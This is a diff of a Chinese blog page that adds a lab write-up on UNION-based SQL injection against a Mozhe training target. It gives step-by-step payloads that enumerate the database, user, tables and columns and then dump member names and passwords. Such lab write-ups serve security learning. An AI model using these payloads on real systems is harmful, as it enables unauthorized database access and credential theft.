@@ -458,14 +458,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.1k
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    5 分
                 </div>
                 
 
@@ -581,6 +581,35 @@
 <p><code>219.153.49.228:47262/new_list.php?id=-1 union select 1,database(),version(),4</code></p>
 <img src="https://gitee.com/mie1732/emc/raw/master/img/202202282252697.png" alt="数据库名字，版本" style="zoom:67%;" />
 
+<p><code>219.153.49.228:47262/new_list.php?id=-1 union select 1,user(),@@version_compile_os,4</code></p>
+<img src="https://gitee.com/mie1732/emc/raw/master/img/202202282255698.png" alt="操作系统，数据库用户" style="zoom:67%;" />
+
+<ul>
+<li>查询</li>
+</ul>
+<p>因为数据库版本为 5.7.22-0ubuntu0.16.04.1（高版本），可用information_schema数据库查询</p>
+<p>查询information_schema.tables数据库下的表名信息：得到的是一个数据库的名字</p>
+<p><code>?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema=&#39;mozhe_Discuz_StormGroup&#39;</code></p>
+<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203010113324.png" alt="image-20220228231803141"></p>
+<p>2处是查询表名，3处未查询直接回显</p>
+<p>从 information_schema.tables表中查询：数据库mozhe_Discuz_StormGroup中的表名信息</p>
+<p>查询mozhe_Discuz_StormGroup数据库下的所有表名信息：</p>
+<p><code>id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#39;mozhe_Discuz_StormGroup&#39;</code></p>
+<img src="https://gitee.com/mie1732/emc/raw/master/img/202202282327935.png" style="zoom:67%;" />
+
+<p>得到mozhe_Discuz_StormGroup数据库下有两个表名</p>
+<p>查询指定表名StormGroup_member下的所有列名信息：</p>
+<p><code>id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;StormGroup_member&#39;</code></p>
+<img src="https://gitee.com/mie1732/emc/raw/master/img/202202282334046.png" alt="四个列名" style="zoom:67%;" />
+
+<p>查询指定列名下的所有数据：</p>
+<p><code>id=-1 union select 1,group_concat(name),group_concat(password),4 from StormGroup_member</code></p>
+<p>使用group_concat()防止漏数据</p>
+<img src="https://gitee.com/mie1732/emc/raw/master/img/202202282356749.png" style="zoom:67%;" />
+
+<ul>
+<li>limit：猜解多个数据：limit x,1 变动猜解</li>
+</ul>
 
                 
             </div>
@@ -986,7 +1015,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">13.1k</span>
+                        class="white-color">13.4k</span>
             
             
             
